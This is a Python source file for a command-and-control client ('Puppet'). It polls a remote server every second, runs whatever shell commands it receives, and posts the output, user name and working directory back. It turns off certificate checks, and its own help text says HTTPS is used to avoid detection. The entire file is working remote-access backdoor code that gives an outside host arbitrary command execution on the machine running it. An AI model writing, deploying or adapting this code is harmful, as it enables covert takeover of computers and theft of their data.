#!/usr/bin/env python3
import os
import sys
from subprocess import getoutput as execute
from uuid import uuid4
from time import sleep

from requests import Session
from urllib3 import disable_warnings

disable_warnings()
DEFAULT_SERVER_PORT = 443


def get_arguments():
    from argparse import ArgumentParser
    parser = ArgumentParser(description="Polls the CNC server, receives the commands from there, "
                                        "executes them and sends back the results. "
                                        "The client and the server use HTTPS for avoiding detection.")
    parser.add_argument('--server-address',
                        dest='server_address',
                        required=True,
                        type=str,
                        help='Specify an IP address or a domain name of the server '
                             'that receives the data stream from the puppet')
    parser.add_argument('--server-port',
                        dest='server_port',
                        required=False,
                        default=DEFAULT_SERVER_PORT,
                        type=int,
                        help='Specify the server port. '
                             f'{DEFAULT_SERVER_PORT}/tcp is set by default.')
    options = parser.parse_args()
    return options


class Puppet:
    def __init__(self, server_base_url: str):
        self.session = Session()
        self.session.verify = False
        self.session.headers['Session-ID'] = f"{uuid4()}"

        self.server_base_url = server_base_url

        self.work_dir = os.getcwd()
        self.user = os.getlogin()
        self.system_encoding = sys.getdefaultencoding()

    def get_command(self):
        try:
            resp = self.session.get(f"{self.server_base_url}/input")
            return resp.json()
        except Exception as e:
            print(e)

    def execute_command(self, command):
        os.chdir(self.work_dir)
        try:
            command_as_array = command.split(' ')
            if 'cd' == command_as_array[0] and len(command_as_array) == 2:
                self.work_dir = command_as_array[1]
                os.chdir(self.work_dir)
                result = ''
            else:
                result = execute(command)
        except Exception as e:
            result = str(e)
        if isinstance(result, bytes):
            result = result.decode(self.system_encoding, 'ignore')
        return {
            "user": self.user,
            "pwd": self.work_dir,
            "system_encoding": self.system_encoding,
            "data": result
        }

    def send_output(self, puppet_message: dict):
        try:
            self.session.post(f"{server_base_url}/output",
                              json=puppet_message)
        except Exception as e:
            print(e)


options = get_arguments()
server_base_url = f"https://{options.server_address}:{options.server_port}"

puppet = Puppet(server_base_url=server_base_url)
while True:
    try:
        sleep(1)
        task = puppet.get_command()
        if not task:
            continue
        else:
            # understand what needs to be done
            if task['task'] == 'SHELL_EXEC':
                cmd = task['command']
                output = puppet.execute_command(command=cmd)
                puppet.send_output(puppet_message=output)
    except Exception as e:
        print(e)
